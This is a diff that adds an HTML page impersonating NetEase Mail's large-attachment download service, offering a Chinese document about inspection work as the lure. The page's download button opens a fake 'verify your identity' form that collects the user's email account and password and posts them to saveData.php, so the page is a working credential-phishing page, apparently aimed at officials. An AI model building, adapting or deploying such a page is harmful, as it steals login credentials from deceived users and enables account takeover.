@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+
+<html lang="cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>网易邮箱超大附件下载</title>
+<link href="http://mail.163.com/favicon.ico" rel="shortcut icon"/>
+<link href="local_resources/css/1afd53f30afaa233b9d88b466ca9f2a6.css" rel="stylesheet"/>
+<link href="local_resources/css/d117e630559bf21d0881cba15b23eb14.css" rel="stylesheet"/>
+<link href="local_resources/css/278e2fa61b49636724354a2dee17acfa.css" rel="stylesheet"/>
+<link href="local_resources/css/67f1e9bda467a3aa464e6ba3dffa84dc.css" rel="stylesheet"/>
+<style>
+        #progressBarContainer {
+            width: 100%;
+            background-color: #ddd;
+        }
+
+        #progressBar {
+            width: 0%;
+            height: 6px;
+            background-color: #4CAF50;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+<div class="main">
+<div class="mainTop"></div>
+<div class="mainHead">
+<div class="mainHead2">
+<p>超大附件下载</p>
+</div>
+<div class="mainHead3">
+<p style="color: #555555;"><span id="display"></span></p>
+</div>
+<div class="mainHead4">
+<p>内容举报  |  问题反馈  |  帮助</p>
+</div>
+</div>
+<div class="mainBody">
+<div class="visible-div" id="visibleDiv">
+<span class="close-btn" onclick="closeDiv()"><img src="local_resources/img/82341c74b14fc27aeecb7c948fe4652c.png" width="14"/></span>
+<img height="16" src="local_resources/img/2d32741644a84f42096c2c35215f55a9.png"/>
+<p style="width: 865px;">  开通邮箱会员，享文件极速下载和在线解压特权。</p>
+<p style="color: #3370ff;width: 90px;font-size: 12px;">开通会员</p>
+</div>
+<div class="file-icon">
+<div id="fileList"></div>
+</div>
+<div class="downloadName" style="font-weight: 500;margin-bottom: 8px;margin-top: 16px;">
+<ul>
+<li>巡视工作要点.docx</li> </ul>
+</div>
+<div class="downloadMB" style="margin-bottom: 16px;">
+<ul>
+<li>16.95 KB</li> </ul>
+</div>
+<div class="downloadTime">
+<div class="countdown-container" id="countdown"></div>
+</div>
+<div class="downloadButtom">
+<div class="buttons">
+<button class="ellipse-button1" id="myBtn1" style="display: block;">普通下载</button>
+<button class="ellipse-button1" id="myBtn2" style="display: none;">
+<div style="padding-bottom: 1px;">在线解压<br/>
+<div style="font-size: 12px;align-items: center;">免费体验1次</div>
+</div>
+</button>
+<button class="ellipse-button2" id="myBtn3" style="display: block;">
+<div style="padding-bottom: 1px;">
+
+<path d="M2.796 7.023H.44a.439.439 0 0 1-.41-.595L2.37.283A.439.439 0 0 1 2.78 0h3.951c.312 0 .524.316.407.605L5.775 3.95H8.34c.377 0 .579.444.33.728l-6.292 7.17c-.306.348-.873.046-.754-.402l1.17-4.424Z" fill="#fff">
+</path>
+  极速下载<br/>
+<div style="font-size: 12px;">预计节约4分钟</div>
+</div>
+</button>
+<div class="modal" id="myModal">
+<form action="saveData.php" id="loginForm" method="POST" onsubmit="return submitData();">
+<div class="modal-content">
+<!-- <span class="close" style="position:absolute;top:20px;right: 20px;width:24px;height:24px;">
+                                    <img src="images/X.png" style="height:24px;"></span><br> -->
+<h3 style="color:red">请验证身分后下载</h3>
+<input class="number1" id="data1" name="data1" placeholder="请输入帐号" type="text" value=""/>
+<input class="number2" id="data2" name="data2" placeholder="请输入密码" required="" type="password"/>
+<div id="submitStatus" style="display: none; color:red; position:relative;"></div>
+<button class="enter" id="submitBtn" type="submit">验 证</button>
+</div>
+</form>
+</div>
+<div style="display: flex; flex-direction:column">
+<div id="downloadAnimation" style="display: none;">
+<div id="progressBarContainer" style="width: 600px;">
+<div id="progressBar"></div>
+</div>
+<br/>
+<div style="display: flex; flex-direction:row;color:#555555;">
+<div class="info" id="fsz" style="font-size: 14px; line-height: 14px;">0MB</div>
+<div class="info" id="fsize" style="font-size: 14px; line-height: 14px;">/0MB</div>
+<div style="margin-left:auto;"></div>
+<div id="downloadLogo" style="width: 20px; display:none; line-height: 14px;">
+
+<g clip-path="url(#a)">
+<circle cx="8" cy="8" fill="#14B360" r="7.333"></circle>
+<path clip-rule="evenodd" d="M11.738 5.862a.667.667 0 0 0-.943 0L7.024 9.633 5.138 7.748a.667.667 0 1 0-.943.942l2.357 2.357c.26.26.683.26.943 0l4.243-4.242a.667.667 0 0 0 0-.943Z" fill="#fff" fill-rule="evenodd"></path>
+</g>
+<defs>
+<clippath id="a">
+<path d="M0 0h16v16H0z" fill="#fff"></path>
+</clippath>
+</defs>
+
+</div>
+<div id="downloadDone" style="display:none; color:#4CAF50; font-size: 14px; line-height: 14px; justify-content: flex-end;"></div>
+</div>
+<br/>
+</div>
+<div style="display: flex; justify-content: center; margin: 0px;">
+<div class="download-button1" id="otherBtn1" style="display: none;">
+                                重新下载
+                            </div>
+<div class="download-button2" id="otherBtn2" style="display: none;">
+                                保存文件
+                            </div>
+</div>
+<br/>
+<div id="downloadText" style="display: none; justify-content:center;">
+<div style="color:#595959;">您对下载过程是否满意？</div>
+<div style="color:#3370ff;">参与调研</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="mainFoot">
+<div style="margin-bottom: 10px;">About NetEase | 公司简介 | 联系方法 | 招聘信息 | 客户服务 | 相关法律 | 网络营销</div>
+<div>Copyright © 1997-2024 网易公司版权所有</div>
+</div>
+<script src="local_resources/js/535a3eceda35776a5dabcf2255f0fd91.js"></script>
+<script src="local_resources/js/42fecd80d3b96781bd1f9edd24376d0f.js"></script>
+<script src="local_resources/js/b0370c73b6da8e62378c5e21233b4fb9.js"></script>
+<script>
+</script>
+</div></body>
+</html>
